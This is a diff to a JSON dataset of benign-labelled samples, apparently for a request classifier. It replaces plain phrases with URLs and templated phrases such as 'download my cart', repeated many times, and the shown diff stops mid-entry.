@@ -1,74 +1,30 @@
 [
   {
-    "text": "hello user login",
+    "text": "https://example.com/home",
     "label": 0
   },
   {
-    "text": "normal request data",
+    "text": "https://github.com/login",
     "label": 0
   },
   {
-    "text": "search shoes online",
+    "text": "https://google.com/search?q=orders",
     "label": 0
   },
   {
-    "text": "open my account",
+    "text": "https://microsoft.com/products",
     "label": 0
   },
   {
-    "text": "user login page",
+    "text": "https://amazon.com/s/account",
     "label": 0
   },
   {
-    "text": "check account balance",
+    "text": "https://app.example.com/profile",
     "label": 0
   },
   {
-    "text": "view profile",
-    "label": 0
-  },
-  {
-    "text": "update profile information",
-    "label": 0
-  },
-  {
-    "text": "search products",
-    "label": 0
-  },
-  {
-    "text": "find shoes",
-    "label": 0
-  },
-  {
-    "text": "show available products",
-    "label": 0
-  },
-  {
-    "text": "get product details",
-    "label": 0
-  },
-  {
-    "text": "view order history",
-    "label": 0
-  },
-  {
-    "text": "track my order",
-    "label": 0
-  },
-  {
-    "text": "contact support",
-    "label": 0
-  },
-  {
-    "text": "customer support page",
-    "label": 0
-  },
-  {
-    "text": "reset my password",
-    "label": 0
-  },
-  {
-    "text": "change account password",
+    "text": "open my settings",
     "label": 0
   },
   {
@@ -76,47 +32,1971 @@
     "label": 0
   },
   {
-    "text": "open dashboard",
+    "text": "search support",
     "label": 0
   },
   {
-    "text": "show recent orders",
+    "text": "update cart information",
     "label": 0
   },
   {
-    "text": "search laptop online",
+    "text": "show recent password",
     "label": 0
   },
   {
-    "text": "search mobile phones",
+    "text": "get balance details",
     "label": 0
   },
   {
-    "text": "buy running shoes",
+    "text": "check products status",
     "label": 0
   },
   {
-    "text": "show products under 100 dollars",
+    "text": "create a new shipping",
     "label": 0
   },
   {
-    "text": "view shopping cart",
+    "text": "download my dashboard",
     "label": 0
   },
   {
-    "text": "checkout my cart",
+    "text": "contact customer support about report",
     "label": 0
   },
   {
-    "text": "apply discount code",
+    "text": "change my document",
     "label": 0
   },
   {
-    "text": "view store information",
+    "text": "list available subscription",
     "label": 0
   },
   {
-    "text": "get shipping information",
+    "text": "track my billing",
+    "label": 0
+  },
+  {
+    "text": "please load the preferences page",
+    "label": 0
+  },
+  {
+    "text": "https://example.com/profile",
+    "label": 0
+  },
+  {
+    "text": "https://github.com/settings",
+    "label": 0
+  },
+  {
+    "text": "https://google.com/search?q=calendar",
+    "label": 0
+  },
+  {
+    "text": "https://microsoft.com/dashboard",
+    "label": 0
+  },
+  {
+    "text": "https://amazon.com/s/analytics",
+    "label": 0
+  },
+  {
+    "text": "https://app.example.com/search",
+    "label": 0
+  },
+  {
+    "text": "open my laptop",
+    "label": 0
+  },
+  {
+    "text": "view orders",
+    "label": 0
+  },
+  {
+    "text": "search profile",
+    "label": 0
+  },
+  {
+    "text": "update account information",
+    "label": 0
+  },
+  {
+    "text": "show recent invoice",
+    "label": 0
+  },
+  {
+    "text": "get settings details",
+    "label": 0
+  },
+  {
+    "text": "check notifications status",
+    "label": 0
+  },
+  {
+    "text": "create a new support",
+    "label": 0
+  },
+  {
+    "text": "download my cart",
+    "label": 0
+  },
+  {
+    "text": "contact customer support about password",
+    "label": 0
+  },
+  {
+    "text": "change my balance",
+    "label": 0
+  },
+  {
+    "text": "list available products",
+    "label": 0
+  },
+  {
+    "text": "track my shipping",
+    "label": 0
+  },
+  {
+    "text": "please load the dashboard page",
+    "label": 0
+  },
+  {
+    "text": "https://example.com/search",
+    "label": 0
+  },
+  {
+    "text": "https://github.com/checkout",
+    "label": 0
+  },
+  {
+    "text": "https://google.com/search?q=subscription",
+    "label": 0
+  },
+  {
+    "text": "https://microsoft.com/docs",
+    "label": 0
+  },
+  {
+    "text": "https://amazon.com/s/preferences",
+    "label": 0
+  },
+  {
+    "text": "https://app.example.com/home",
+    "label": 0
+  },
+  {
+    "text": "open my team",
+    "label": 0
+  },
+  {
+    "text": "view calendar",
+    "label": 0
+  },
+  {
+    "text": "search files",
+    "label": 0
+  },
+  {
+    "text": "update analytics information",
+    "label": 0
+  },
+  {
+    "text": "show recent shoes",
+    "label": 0
+  },
+  {
+    "text": "get laptop details",
+    "label": 0
+  },
+  {
+    "text": "check orders status",
+    "label": 0
+  },
+  {
+    "text": "create a new profile",
+    "label": 0
+  },
+  {
+    "text": "download my account",
+    "label": 0
+  },
+  {
+    "text": "contact customer support about invoice",
+    "label": 0
+  },
+  {
+    "text": "change my settings",
+    "label": 0
+  },
+  {
+    "text": "list available notifications",
+    "label": 0
+  },
+  {
+    "text": "track my support",
+    "label": 0
+  },
+  {
+    "text": "please load the cart page",
+    "label": 0
+  },
+  {
+    "text": "https://example.com/home",
+    "label": 0
+  },
+  {
+    "text": "https://github.com/login",
+    "label": 0
+  },
+  {
+    "text": "https://google.com/search?q=products",
+    "label": 0
+  },
+  {
+    "text": "https://microsoft.com/products",
+    "label": 0
+  },
+  {
+    "text": "https://amazon.com/s/dashboard",
+    "label": 0
+  },
+  {
+    "text": "https://app.example.com/profile",
+    "label": 0
+  },
+  {
+    "text": "open my document",
+    "label": 0
+  },
+  {
+    "text": "view subscription",
+    "label": 0
+  },
+  {
+    "text": "search billing",
+    "label": 0
+  },
+  {
+    "text": "update preferences information",
+    "label": 0
+  },
+  {
+    "text": "show recent messages",
+    "label": 0
+  },
+  {
+    "text": "get team details",
+    "label": 0
+  },
+  {
+    "text": "check calendar status",
+    "label": 0
+  },
+  {
+    "text": "create a new files",
+    "label": 0
+  },
+  {
+    "text": "download my analytics",
+    "label": 0
+  },
+  {
+    "text": "contact customer support about shoes",
+    "label": 0
+  },
+  {
+    "text": "change my laptop",
+    "label": 0
+  },
+  {
+    "text": "list available orders",
+    "label": 0
+  },
+  {
+    "text": "track my profile",
+    "label": 0
+  },
+  {
+    "text": "please load the account page",
+    "label": 0
+  },
+  {
+    "text": "https://example.com/profile",
+    "label": 0
+  },
+  {
+    "text": "https://github.com/settings",
+    "label": 0
+  },
+  {
+    "text": "https://google.com/search?q=notifications",
+    "label": 0
+  },
+  {
+    "text": "https://microsoft.com/dashboard",
+    "label": 0
+  },
+  {
+    "text": "https://amazon.com/s/cart",
+    "label": 0
+  },
+  {
+    "text": "https://app.example.com/search",
+    "label": 0
+  },
+  {
+    "text": "open my balance",
+    "label": 0
+  },
+  {
+    "text": "view products",
+    "label": 0
+  },
+  {
+    "text": "search shipping",
+    "label": 0
+  },
+  {
+    "text": "update dashboard information",
+    "label": 0
+  },
+  {
+    "text": "show recent report",
+    "label": 0
+  },
+  {
+    "text": "get document details",
+    "label": 0
+  },
+  {
+    "text": "check subscription status",
+    "label": 0
+  },
+  {
+    "text": "create a new billing",
+    "label": 0
+  },
+  {
+    "text": "download my preferences",
+    "label": 0
+  },
+  {
+    "text": "contact customer support about messages",
+    "label": 0
+  },
+  {
+    "text": "change my team",
+    "label": 0
+  },
+  {
+    "text": "list available calendar",
+    "label": 0
+  },
+  {
+    "text": "track my files",
+    "label": 0
+  },
+  {
+    "text": "please load the analytics page",
+    "label": 0
+  },
+  {
+    "text": "https://example.com/search",
+    "label": 0
+  },
+  {
+    "text": "https://github.com/checkout",
+    "label": 0
+  },
+  {
+    "text": "https://google.com/search?q=orders",
+    "label": 0
+  },
+  {
+    "text": "https://microsoft.com/docs",
+    "label": 0
+  },
+  {
+    "text": "https://amazon.com/s/account",
+    "label": 0
+  },
+  {
+    "text": "https://app.example.com/home",
+    "label": 0
+  },
+  {
+    "text": "open my settings",
+    "label": 0
+  },
+  {
+    "text": "view notifications",
+    "label": 0
+  },
+  {
+    "text": "search support",
+    "label": 0
+  },
+  {
+    "text": "update cart information",
+    "label": 0
+  },
+  {
+    "text": "show recent password",
+    "label": 0
+  },
+  {
+    "text": "get balance details",
+    "label": 0
+  },
+  {
+    "text": "check products status",
+    "label": 0
+  },
+  {
+    "text": "create a new shipping",
+    "label": 0
+  },
+  {
+    "text": "download my dashboard",
+    "label": 0
+  },
+  {
+    "text": "contact customer support about report",
+    "label": 0
+  },
+  {
+    "text": "change my document",
+    "label": 0
+  },
+  {
+    "text": "list available subscription",
+    "label": 0
+  },
+  {
+    "text": "track my billing",
+    "label": 0
+  },
+  {
+    "text": "please load the preferences page",
+    "label": 0
+  },
+  {
+    "text": "https://example.com/home",
+    "label": 0
+  },
+  {
+    "text": "https://github.com/login",
+    "label": 0
+  },
+  {
+    "text": "https://google.com/search?q=calendar",
+    "label": 0
+  },
+  {
+    "text": "https://microsoft.com/products",
+    "label": 0
+  },
+  {
+    "text": "https://amazon.com/s/analytics",
+    "label": 0
+  },
+  {
+    "text": "https://app.example.com/profile",
+    "label": 0
+  },
+  {
+    "text": "open my laptop",
+    "label": 0
+  },
+  {
+    "text": "view orders",
+    "label": 0
+  },
+  {
+    "text": "search profile",
+    "label": 0
+  },
+  {
+    "text": "update account information",
+    "label": 0
+  },
+  {
+    "text": "show recent invoice",
+    "label": 0
+  },
+  {
+    "text": "get settings details",
+    "label": 0
+  },
+  {
+    "text": "check notifications status",
+    "label": 0
+  },
+  {
+    "text": "create a new support",
+    "label": 0
+  },
+  {
+    "text": "download my cart",
+    "label": 0
+  },
+  {
+    "text": "contact customer support about password",
+    "label": 0
+  },
+  {
+    "text": "change my balance",
+    "label": 0
+  },
+  {
+    "text": "list available products",
+    "label": 0
+  },
+  {
+    "text": "track my shipping",
+    "label": 0
+  },
+  {
+    "text": "please load the dashboard page",
+    "label": 0
+  },
+  {
+    "text": "https://example.com/profile",
+    "label": 0
+  },
+  {
+    "text": "https://github.com/settings",
+    "label": 0
+  },
+  {
+    "text": "https://google.com/search?q=subscription",
+    "label": 0
+  },
+  {
+    "text": "https://microsoft.com/dashboard",
+    "label": 0
+  },
+  {
+    "text": "https://amazon.com/s/preferences",
+    "label": 0
+  },
+  {
+    "text": "https://app.example.com/search",
+    "label": 0
+  },
+  {
+    "text": "open my team",
+    "label": 0
+  },
+  {
+    "text": "view calendar",
+    "label": 0
+  },
+  {
+    "text": "search files",
+    "label": 0
+  },
+  {
+    "text": "update analytics information",
+    "label": 0
+  },
+  {
+    "text": "show recent shoes",
+    "label": 0
+  },
+  {
+    "text": "get laptop details",
+    "label": 0
+  },
+  {
+    "text": "check orders status",
+    "label": 0
+  },
+  {
+    "text": "create a new profile",
+    "label": 0
+  },
+  {
+    "text": "download my account",
+    "label": 0
+  },
+  {
+    "text": "contact customer support about invoice",
+    "label": 0
+  },
+  {
+    "text": "change my settings",
+    "label": 0
+  },
+  {
+    "text": "list available notifications",
+    "label": 0
+  },
+  {
+    "text": "track my support",
+    "label": 0
+  },
+  {
+    "text": "please load the cart page",
+    "label": 0
+  },
+  {
+    "text": "https://example.com/search",
+    "label": 0
+  },
+  {
+    "text": "https://github.com/checkout",
+    "label": 0
+  },
+  {
+    "text": "https://google.com/search?q=products",
+    "label": 0
+  },
+  {
+    "text": "https://microsoft.com/docs",
+    "label": 0
+  },
+  {
+    "text": "https://amazon.com/s/dashboard",
+    "label": 0
+  },
+  {
+    "text": "https://app.example.com/home",
+    "label": 0
+  },
+  {
+    "text": "open my document",
+    "label": 0
+  },
+  {
+    "text": "view subscription",
+    "label": 0
+  },
+  {
+    "text": "search billing",
+    "label": 0
+  },
+  {
+    "text": "update preferences information",
+    "label": 0
+  },
+  {
+    "text": "show recent messages",
+    "label": 0
+  },
+  {
+    "text": "get team details",
+    "label": 0
+  },
+  {
+    "text": "check calendar status",
+    "label": 0
+  },
+  {
+    "text": "create a new files",
+    "label": 0
+  },
+  {
+    "text": "download my analytics",
+    "label": 0
+  },
+  {
+    "text": "contact customer support about shoes",
+    "label": 0
+  },
+  {
+    "text": "change my laptop",
+    "label": 0
+  },
+  {
+    "text": "list available orders",
+    "label": 0
+  },
+  {
+    "text": "track my profile",
+    "label": 0
+  },
+  {
+    "text": "please load the account page",
+    "label": 0
+  },
+  {
+    "text": "https://example.com/home",
+    "label": 0
+  },
+  {
+    "text": "https://github.com/login",
+    "label": 0
+  },
+  {
+    "text": "https://google.com/search?q=notifications",
+    "label": 0
+  },
+  {
+    "text": "https://microsoft.com/products",
+    "label": 0
+  },
+  {
+    "text": "https://amazon.com/s/cart",
+    "label": 0
+  },
+  {
+    "text": "https://app.example.com/profile",
+    "label": 0
+  },
+  {
+    "text": "open my balance",
+    "label": 0
+  },
+  {
+    "text": "view products",
+    "label": 0
+  },
+  {
+    "text": "search shipping",
+    "label": 0
+  },
+  {
+    "text": "update dashboard information",
+    "label": 0
+  },
+  {
+    "text": "show recent report",
+    "label": 0
+  },
+  {
+    "text": "get document details",
+    "label": 0
+  },
+  {
+    "text": "check subscription status",
+    "label": 0
+  },
+  {
+    "text": "create a new billing",
+    "label": 0
+  },
+  {
+    "text": "download my preferences",
+    "label": 0
+  },
+  {
+    "text": "contact customer support about messages",
+    "label": 0
+  },
+  {
+    "text": "change my team",
+    "label": 0
+  },
+  {
+    "text": "list available calendar",
+    "label": 0
+  },
+  {
+    "text": "track my files",
+    "label": 0
+  },
+  {
+    "text": "please load the analytics page",
+    "label": 0
+  },
+  {
+    "text": "https://example.com/profile",
+    "label": 0
+  },
+  {
+    "text": "https://github.com/settings",
+    "label": 0
+  },
+  {
+    "text": "https://google.com/search?q=orders",
+    "label": 0
+  },
+  {
+    "text": "https://microsoft.com/dashboard",
+    "label": 0
+  },
+  {
+    "text": "https://amazon.com/s/account",
+    "label": 0
+  },
+  {
+    "text": "https://app.example.com/search",
+    "label": 0
+  },
+  {
+    "text": "open my settings",
+    "label": 0
+  },
+  {
+    "text": "view notifications",
+    "label": 0
+  },
+  {
+    "text": "search support",
+    "label": 0
+  },
+  {
+    "text": "update cart information",
+    "label": 0
+  },
+  {
+    "text": "show recent password",
+    "label": 0
+  },
+  {
+    "text": "get balance details",
+    "label": 0
+  },
+  {
+    "text": "check products status",
+    "label": 0
+  },
+  {
+    "text": "create a new shipping",
+    "label": 0
+  },
+  {
+    "text": "download my dashboard",
+    "label": 0
+  },
+  {
+    "text": "contact customer support about report",
+    "label": 0
+  },
+  {
+    "text": "change my document",
+    "label": 0
+  },
+  {
+    "text": "list available subscription",
+    "label": 0
+  },
+  {
+    "text": "track my billing",
+    "label": 0
+  },
+  {
+    "text": "please load the preferences page",
+    "label": 0
+  },
+  {
+    "text": "https://example.com/search",
+    "label": 0
+  },
+  {
+    "text": "https://github.com/checkout",
+    "label": 0
+  },
+  {
+    "text": "https://google.com/search?q=calendar",
+    "label": 0
+  },
+  {
+    "text": "https://microsoft.com/docs",
+    "label": 0
+  },
+  {
+    "text": "https://amazon.com/s/analytics",
+    "label": 0
+  },
+  {
+    "text": "https://app.example.com/home",
+    "label": 0
+  },
+  {
+    "text": "open my laptop",
+    "label": 0
+  },
+  {
+    "text": "view orders",
+    "label": 0
+  },
+  {
+    "text": "search profile",
+    "label": 0
+  },
+  {
+    "text": "update account information",
+    "label": 0
+  },
+  {
+    "text": "show recent invoice",
+    "label": 0
+  },
+  {
+    "text": "get settings details",
+    "label": 0
+  },
+  {
+    "text": "check notifications status",
+    "label": 0
+  },
+  {
+    "text": "create a new support",
+    "label": 0
+  },
+  {
+    "text": "download my cart",
+    "label": 0
+  },
+  {
+    "text": "contact customer support about password",
+    "label": 0
+  },
+  {
+    "text": "change my balance",
+    "label": 0
+  },
+  {
+    "text": "list available products",
+    "label": 0
+  },
+  {
+    "text": "track my shipping",
+    "label": 0
+  },
+  {
+    "text": "please load the dashboard page",
+    "label": 0
+  },
+  {
+    "text": "https://example.com/home",
+    "label": 0
+  },
+  {
+    "text": "https://github.com/login",
+    "label": 0
+  },
+  {
+    "text": "https://google.com/search?q=subscription",
+    "label": 0
+  },
+  {
+    "text": "https://microsoft.com/products",
+    "label": 0
+  },
+  {
+    "text": "https://amazon.com/s/preferences",
+    "label": 0
+  },
+  {
+    "text": "https://app.example.com/profile",
+    "label": 0
+  },
+  {
+    "text": "open my team",
+    "label": 0
+  },
+  {
+    "text": "view calendar",
+    "label": 0
+  },
+  {
+    "text": "search files",
+    "label": 0
+  },
+  {
+    "text": "update analytics information",
+    "label": 0
+  },
+  {
+    "text": "show recent shoes",
+    "label": 0
+  },
+  {
+    "text": "get laptop details",
+    "label": 0
+  },
+  {
+    "text": "check orders status",
+    "label": 0
+  },
+  {
+    "text": "create a new profile",
+    "label": 0
+  },
+  {
+    "text": "download my account",
+    "label": 0
+  },
+  {
+    "text": "contact customer support about invoice",
+    "label": 0
+  },
+  {
+    "text": "change my settings",
+    "label": 0
+  },
+  {
+    "text": "list available notifications",
+    "label": 0
+  },
+  {
+    "text": "track my support",
+    "label": 0
+  },
+  {
+    "text": "please load the cart page",
+    "label": 0
+  },
+  {
+    "text": "https://example.com/profile",
+    "label": 0
+  },
+  {
+    "text": "https://github.com/settings",
+    "label": 0
+  },
+  {
+    "text": "https://google.com/search?q=products",
+    "label": 0
+  },
+  {
+    "text": "https://microsoft.com/dashboard",
+    "label": 0
+  },
+  {
+    "text": "https://amazon.com/s/dashboard",
+    "label": 0
+  },
+  {
+    "text": "https://app.example.com/search",
+    "label": 0
+  },
+  {
+    "text": "open my document",
+    "label": 0
+  },
+  {
+    "text": "view subscription",
+    "label": 0
+  },
+  {
+    "text": "search billing",
+    "label": 0
+  },
+  {
+    "text": "update preferences information",
+    "label": 0
+  },
+  {
+    "text": "show recent messages",
+    "label": 0
+  },
+  {
+    "text": "get team details",
+    "label": 0
+  },
+  {
+    "text": "check calendar status",
+    "label": 0
+  },
+  {
+    "text": "create a new files",
+    "label": 0
+  },
+  {
+    "text": "download my analytics",
+    "label": 0
+  },
+  {
+    "text": "contact customer support about shoes",
+    "label": 0
+  },
+  {
+    "text": "change my laptop",
+    "label": 0
+  },
+  {
+    "text": "list available orders",
+    "label": 0
+  },
+  {
+    "text": "track my profile",
+    "label": 0
+  },
+  {
+    "text": "please load the account page",
+    "label": 0
+  },
+  {
+    "text": "https://example.com/search",
+    "label": 0
+  },
+  {
+    "text": "https://github.com/checkout",
+    "label": 0
+  },
+  {
+    "text": "https://google.com/search?q=notifications",
+    "label": 0
+  },
+  {
+    "text": "https://microsoft.com/docs",
+    "label": 0
+  },
+  {
+    "text": "https://amazon.com/s/cart",
+    "label": 0
+  },
+  {
+    "text": "https://app.example.com/home",
+    "label": 0
+  },
+  {
+    "text": "open my balance",
+    "label": 0
+  },
+  {
+    "text": "view products",
+    "label": 0
+  },
+  {
+    "text": "search shipping",
+    "label": 0
+  },
+  {
+    "text": "update dashboard information",
+    "label": 0
+  },
+  {
+    "text": "show recent report",
+    "label": 0
+  },
+  {
+    "text": "get document details",
+    "label": 0
+  },
+  {
+    "text": "check subscription status",
+    "label": 0
+  },
+  {
+    "text": "create a new billing",
+    "label": 0
+  },
+  {
+    "text": "download my preferences",
+    "label": 0
+  },
+  {
+    "text": "contact customer support about messages",
+    "label": 0
+  },
+  {
+    "text": "change my team",
+    "label": 0
+  },
+  {
+    "text": "list available calendar",
+    "label": 0
+  },
+  {
+    "text": "track my files",
+    "label": 0
+  },
+  {
+    "text": "please load the analytics page",
+    "label": 0
+  },
+  {
+    "text": "https://example.com/home",
+    "label": 0
+  },
+  {
+    "text": "https://github.com/login",
+    "label": 0
+  },
+  {
+    "text": "https://google.com/search?q=orders",
+    "label": 0
+  },
+  {
+    "text": "https://microsoft.com/products",
+    "label": 0
+  },
+  {
+    "text": "https://amazon.com/s/account",
+    "label": 0
+  },
+  {
+    "text": "https://app.example.com/profile",
+    "label": 0
+  },
+  {
+    "text": "open my settings",
+    "label": 0
+  },
+  {
+    "text": "view notifications",
+    "label": 0
+  },
+  {
+    "text": "search support",
+    "label": 0
+  },
+  {
+    "text": "update cart information",
+    "label": 0
+  },
+  {
+    "text": "show recent password",
+    "label": 0
+  },
+  {
+    "text": "get balance details",
+    "label": 0
+  },
+  {
+    "text": "check products status",
+    "label": 0
+  },
+  {
+    "text": "create a new shipping",
+    "label": 0
+  },
+  {
+    "text": "download my dashboard",
+    "label": 0
+  },
+  {
+    "text": "contact customer support about report",
+    "label": 0
+  },
+  {
+    "text": "change my document",
+    "label": 0
+  },
+  {
+    "text": "list available subscription",
+    "label": 0
+  },
+  {
+    "text": "track my billing",
+    "label": 0
+  },
+  {
+    "text": "please load the preferences page",
+    "label": 0
+  },
+  {
+    "text": "https://example.com/profile",
+    "label": 0
+  },
+  {
+    "text": "https://github.com/settings",
+    "label": 0
+  },
+  {
+    "text": "https://google.com/search?q=calendar",
+    "label": 0
+  },
+  {
+    "text": "https://microsoft.com/dashboard",
+    "label": 0
+  },
+  {
+    "text": "https://amazon.com/s/analytics",
+    "label": 0
+  },
+  {
+    "text": "https://app.example.com/search",
+    "label": 0
+  },
+  {
+    "text": "open my laptop",
+    "label": 0
+  },
+  {
+    "text": "view orders",
+    "label": 0
+  },
+  {
+    "text": "search profile",
+    "label": 0
+  },
+  {
+    "text": "update account information",
+    "label": 0
+  },
+  {
+    "text": "show recent invoice",
+    "label": 0
+  },
+  {
+    "text": "get settings details",
+    "label": 0
+  },
+  {
+    "text": "check notifications status",
+    "label": 0
+  },
+  {
+    "text": "create a new support",
+    "label": 0
+  },
+  {
+    "text": "download my cart",
+    "label": 0
+  },
+  {
+    "text": "contact customer support about password",
+    "label": 0
+  },
+  {
+    "text": "change my balance",
+    "label": 0
+  },
+  {
+    "text": "list available products",
+    "label": 0
+  },
+  {
+    "text": "track my shipping",
+    "label": 0
+  },
+  {
+    "text": "please load the dashboard page",
+    "label": 0
+  },
+  {
+    "text": "https://example.com/search",
+    "label": 0
+  },
+  {
+    "text": "https://github.com/checkout",
+    "label": 0
+  },
+  {
+    "text": "https://google.com/search?q=subscription",
+    "label": 0
+  },
+  {
+    "text": "https://microsoft.com/docs",
+    "label": 0
+  },
+  {
+    "text": "https://amazon.com/s/preferences",
+    "label": 0
+  },
+  {
+    "text": "https://app.example.com/home",
+    "label": 0
+  },
+  {
+    "text": "open my team",
+    "label": 0
+  },
+  {
+    "text": "view calendar",
+    "label": 0
+  },
+  {
+    "text": "search files",
+    "label": 0
+  },
+  {
+    "text": "update analytics information",
+    "label": 0
+  },
+  {
+    "text": "show recent shoes",
+    "label": 0
+  },
+  {
+    "text": "get laptop details",
+    "label": 0
+  },
+  {
+    "text": "check orders status",
+    "label": 0
+  },
+  {
+    "text": "create a new profile",
+    "label": 0
+  },
+  {
+    "text": "download my account",
+    "label": 0
+  },
+  {
+    "text": "contact customer support about invoice",
+    "label": 0
+  },
+  {
+    "text": "change my settings",
+    "label": 0
+  },
+  {
+    "text": "list available notifications",
+    "label": 0
+  },
+  {
+    "text": "track my support",
+    "label": 0
+  },
+  {
+    "text": "please load the cart page",
+    "label": 0
+  },
+  {
+    "text": "https://example.com/home",
+    "label": 0
+  },
+  {
+    "text": "https://github.com/login",
+    "label": 0
+  },
+  {
+    "text": "https://google.com/search?q=products",
+    "label": 0
+  },
+  {
+    "text": "https://microsoft.com/products",
+    "label": 0
+  },
+  {
+    "text": "https://amazon.com/s/dashboard",
+    "label": 0
+  },
+  {
+    "text": "https://app.example.com/profile",
+    "label": 0
+  },
+  {
+    "text": "open my document",
+    "label": 0
+  },
+  {
+    "text": "view subscription",
+    "label": 0
+  },
+  {
+    "text": "search billing",
+    "label": 0
+  },
+  {
+    "text": "update preferences information",
+    "label": 0
+  },
+  {
+    "text": "show recent messages",
+    "label": 0
+  },
+  {
+    "text": "get team details",
+    "label": 0
+  },
+  {
+    "text": "check calendar status",
+    "label": 0
+  },
+  {
+    "text": "create a new files",
+    "label": 0
+  },
+  {
+    "text": "download my analytics",
+    "label": 0
+  },
+  {
+    "text": "contact customer support about shoes",
+    "label": 0
+  },
+  {
+    "text": "change my laptop",
+    "label": 0
+  },
+  {
+    "text": "list available orders",
+    "label": 0
+  },
+  {
+    "text": "track my profile",
+    "label": 0
+  },
+  {
+    "text": "please load the account page",
+    "label": 0
+  },
+  {
+    "text": "https://example.com/profile",
+    "label": 0
+  },
+  {
+    "text": "https://github.com/settings",
+    "label": 0
+  },
+  {
+    "text": "https://google.com/search?q=notifications",
+    "label": 0
+  },
+  {
+    "text": "https://microsoft.com/dashboard",
+    "label": 0
+  },
+  {
+    "text": "https://amazon.com/s/cart",
+    "label": 0
+  },
+  {
+    "text": "https://app.example.com/search",
+    "label": 0
+  },
+  {
+    "text": "open my balance",
+    "label": 0
+  },
+  {
+    "text": "view products",
+    "label": 0
+  },
+  {
+    "text": "search shipping",
+    "label": 0
+  },
+  {
+    "text": "update dashboard information",
+    "label": 0
+  },
+  {
+    "text": "show recent report",
+    "label": 0
+  },
+  {
+    "text": "get document details",
+    "label": 0
+  },
+  {
+    "text": "check subscription status",
+    "label": 0
+  },
+  {
+    "text": "create a new billing",
+    "label": 0
+  },
+  {
+    "text": "download my preferences",
+    "label": 0
+  },
+  {
+    "text": "contact customer support about messages",
+    "label": 0
+  },
+  {
+    "text": "change my team",
+    "label": 0
+  },
+  {
+    "text": "list available calendar",
+    "label": 0
+  },
+  {
+    "text": "track my files",
+    "label": 0
+  },
+  {
+    "text": "please load the analytics page",
+    "label": 0
+  },
+  {
+    "text": "https://example.com/search",
+    "label": 0
+  },
+  {
+    "text": "https://github.com/checkout",
+    "label": 0
+  },
+  {
+    "text": "https://google.com/search?q=orders",
+    "label": 0
+  },
+  {
+    "text": "https://microsoft.com/docs",
+    "label": 0
+  },
+  {
+    "text": "https://amazon.com/s/account",
+    "label": 0
+  },
+  {
+    "text": "https://app.example.com/home",
+    "label": 0
+  },
+  {
+    "text": "open my settings",
+    "label": 0
+  },
+  {
+    "text": "view notifications",
+    "label": 0
+  },
+  {
+    "text": "search support",
+    "label": 0
+  },
+  {
+    "text": "update cart information",
+    "label": 0
+  },
+  {
+    "text": "show recent password",
+    "label": 0
+  },
+  {
+    "text": "get balance details",
+    "label": 0
+  },
+  {
+    "text": "check products status",
+    "label": 0
+  },
+  {
+    "text": "create a new shipping",
+    "label": 0
+  },
+  {
+    "text": "download my dashboard",
+    "label": 0
+  },
+  {
+    "text": "contact customer support about report",
+    "label": 0
+  },
+  {
+    "text": "change my document",
+    "label": 0
+  },
+  {
+    "text": "list available subscription",
+    "label": 0
+  },
+  {
+    "text": "track my billing",
+    "label": 0
+  },
+  {
+    "text": "please load the preferences page",
+    "label": 0
+  },
+  {
+    "text": "https://example.com/home",
+    "label": 0
+  },
+  {
+    "text": "https://github.com/login",
+    "label": 0
+  },
+  {
+    "text": "https://google.com/search?q=calendar",
+    "label": 0
+  },
+  {
+    "text": "https://microsoft.com/products",
+    "label": 0
+  },
+  {
+    "text": "https://amazon.com/s/analytics",
+    "label": 0
+  },
+  {
+    "text": "https://app.example.com/profile",
+    "label": 0
+  },
+  {
+    "text": "open my laptop",
+    "label": 0
+  },
+  {
+    "text": "view orders",
+    "label": 0
+  },
+  {
+    "text": "search profile",
+    "label": 0
+  },
+  {
+    "text": "update account information",
+    "label": 0
+  },
+  {
+    "text": "show recent invoice",
+    "label": 0
+  },
+  {
+    "text": "get settings details",
+    "label": 0
+  },
+  {
+    "text": "check notifications status",
+    "label": 0
+  },
+  {
+    "text": "create a new support",
+    "label": 0
+  },
+  {
+    "text": "download my cart",
+    "label": 0
+  },
+  {
+    "text": "contact customer support about password",
+    "label": 0
+  },
+  {
+    "text": "change my balance",
+    "label": 0
+  },
+  {
+    "text": "list available products",
+    "label": 0
+  },
+  {
+    "text": "track my shipping",
+    "label": 0
+  },
+  {
+    "text": "please load the dashboard page",
+    "label": 0
+  },
+  {
+    "text": "https://example.com/profile",
+    "label": 0
+  },
+  {
+    "text": "https://github.com/settings",
+    "label": 0
+  },
+  {
+    "text": "https://google.com/search?q=subscription",
+    "label": 0
+  },
+  {
+    "text": "https://microsoft.com/dashboard",
+    "label": 0
+  },
+  {
+    "text": "https://amazon.com/s/preferences",
+    "label": 0
+  },
+  {
+    "text": "https://app.example.com/search",
+    "label": 0
+  },
+  {
+    "text": "open my team",
+    "label": 0
+  },
+  {
+    "text": "view calendar",
+    "label": 0
+  },
+  {
+    "text": "search files",
+    "label": 0
+  },
+  {
+    "text": "update analytics information",
+    "label": 0
+  },
+  {
+    "text": "show recent shoes",
+    "label": 0
+  },
+  {
+    "text": "get laptop details",
+    "label": 0
+  },
+  {
+    "text": "check orders status",
+    "label": 0
+  },
+  {
+    "text": "create a new profile",
+    "label": 0
+  },
+  {
+    "text": "download my account",
+    "label": 0
+  },
+  {
+    "text": "contact customer support about invoice",
+    "label": 0
+  },
+  {
+    "text": "change my settings",
+    "label": 0
+  },
+  {
+    "text": "list available notifications",
+    "label": 0
+  },
+  {
+    "text": "track my support",
+    "label": 0
+  },
+  {
+    "text": "please load the cart page",
+    "label": 0
+  },
+  {
+    "text": "https://example.com/search",
+    "label": 0
+  },
+  {
+    "text": "https://github.com/checkout",
+    "label": 0
+  },
+  {
+    "text": "https://google.com/search?q=products",
+    "label": 0
+  },
+  {
+    "text": "https://microsoft.com/docs",
+    "label": 0
+  },
+  {
+    "text": "https://amazon.com/s/dashboard",
+    "label": 0
+  },
+  {
+    "text": "https://app.example.com/home",
+    "label": 0
+  },
+  {
+    "text": "open my document",
+    "label": 0
+  },
+  {
+    "text": "view subscription",
+    "label": 0
+  },
+  {
+    "text": "search billing",
+    "label": 0
+  },
+  {
+    "text": "update preferences information",
+    "label": 0
+  },
+  {
+    "text": "show recent messages",
+    "label": 0
+  },
+  {
+    "text": "get team details",
+    "label": 0
+  },
+  {
+    "text": "check calendar status",
+    "label": 0
+  },
+  {
+    "text": "create a new files",
+    "label": 0
+  },
+  {
+    "text": "download my analytics",
+    "label": 0
+  },
+  {
+    "text": "contact customer support about shoes",
+    "label": 0
+  },
+  {
+    "text": "change my laptop",
+    "label": 0
+  },
+  {
+    "text": "list available orders",
+    "label": 0
+  },
+  {
+    "text": "track my profile",
+    "label": 0
+  },
+  {
